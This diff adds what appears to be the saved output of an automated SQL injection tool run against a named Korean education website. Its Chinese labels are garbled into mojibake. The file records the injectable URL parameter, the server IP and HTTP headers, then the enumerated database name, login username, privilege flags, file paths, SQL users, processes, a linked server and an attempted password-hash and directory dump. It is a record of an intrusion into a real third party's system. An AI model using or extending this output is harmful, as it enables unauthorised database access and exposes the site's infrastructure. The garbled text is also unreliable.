@@ -1,0 +1,86 @@
+¡öÂ©¶´ĞÅÏ¢:============================================================
+ ¡¤URL:http://www.kteacher.co.kr/common/t_view.asp?page=4&id=sp&bbs_cd=L3&BBS_NO=537
+ ¡¤Ò³Ãæ±êÌâ£º::ì¤‘ì•™í•™ì›:: TOP10 ëŒ€í•™ ë§ì¶¤êµìœ¡
+ ¡¤²ÎÊı:page=4&id=sp&bbs_cd=L3&BBS_NO=537
+ ¡¤·½·¨:GET
+ ¡¤ÀàĞÍ:Numeric
+ ¡¤ÀûÓÃ·½·¨:And
+ ¡¤½Å±¾ÓïÑÔ:asp
+ ¡¤IP:210.124.230.247
+ ¡¤Êı¾İ¿â:SQL Server
+ ¡¤HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:24:55 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 27305
+Content-Type: text/html; Charset=utf-8
+Set-Cookie: ASPSESSIONIDQAQSDDSD=OLJFOCBAPKOIDNBILEMFJCDG; path=/
+Cache-control: private
+
+
+
+¡öÊı¾İ¿âĞÅÏ¢:============================================================
+- Êı¾İ¿âÃû£ºjungangDB
+- ÓÃ»§Ãû£º99kangbuk
+- °æ±¾£ºMicrosoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- ·şÎñÆ÷Ãû£ºEDU-MOZZ0N5V3SY
+- ·şÎñÃû£ºMSSQLSERVER
+- ÏµÍ³ÓÃ»§Ãû£º99kangbuk
+
+ ¡¤µ±Ç°ÓÃ»§È¨ÏŞ£º
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 0
+db_backupoperator: 0
+db_datawriter: 0
+
+ ¡¤Êı¾İ¿âĞÅÏ¢:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+jungangDB	D:\MSSQL\Data\jungangDB_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ¡¤SQL ServerÓÃ»§ÃûÁĞ±í£º
+ÓÃ»§Ãû		½ÇÉ«		°²È«±àºÅ
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ¡¤Êı¾İ¿âÏà¹Ø½ø³ÌĞÅÏ¢:
+³ÌĞòÃû	×´Ì¬	Ö÷»úÃû	Ö÷»ú½ø³ÌID	ÃüÁîĞĞ	NTÓÃ»§Ãû
+----------------------------------------------------------------------------------------------------
+È¡¼ÇÂ¼ÊıÊ§°Ü£¬Ê¹ÓÃÉè¶¨Öµ£º5
+SQLAgent - Generic Refresher	sleeping	EDU-JUNGANG	2200	AWAITING COMMAND	Administrator	
+SQLAgent - Alert Engine	sleeping	EDU-JUNGANG	2200	AWAITING COMMAND	Administrator	
+Internet Information Services	sleeping	EDU-JUNGANG	3504	AWAITING COMMAND		
+Internet Information Services	runnable	EDU-JUNGANG	3504	UPDATE		
+	background			TASK MANAGER		
+
+ ¡¤Á´½ÓµÄ·şÎñÆ÷ĞÅÏ¢:
+·şÎñÆ÷Ãû	·şÎñÆ÷²úÆ·	Ìá¹©ÕßÃû	Êı¾İÔ´	Î»ÖÃ	·şÎñÆ÷ÍøÂçÃû
+----------------------------------------------------------------------------------------------------
+EDU-MOZZ0N5V3SY	SQL Server	SQLOLEDB	EDU-MOZZ0N5V3SY		EDU-MOZZ0N5V3SY	
+
+ ¡¤Êı¾İ¿âÓÃ»§µÇÂ¼ĞÅÏ¢£º
+ÓÃ»§Ãû	ÃÜÂëHASH	Êı¾İ¿â±àºÅ	ÓïÑÔ	Ê±¼ä1	Ê±¼ä2
+----------------------------------------------------------------------------------------------------
+È¡¼ÇÂ¼ÊıÊ§°Ü£¬Ê¹ÓÃÉè¶¨Öµ£º5
+
+Dir of C:: 
+´íÎó´úÂë: 0x80004005
+´íÎóÔ­Òò: [Microsoft][ODBC Çı¶¯³ÌĞò¹ÜÀíÆ÷] Î´·¢ÏÖÊı¾İÔ´Ãû³Æ²¢ÇÒÎ´Ö¸¶¨Ä¬ÈÏÇı¶¯³ÌĞò
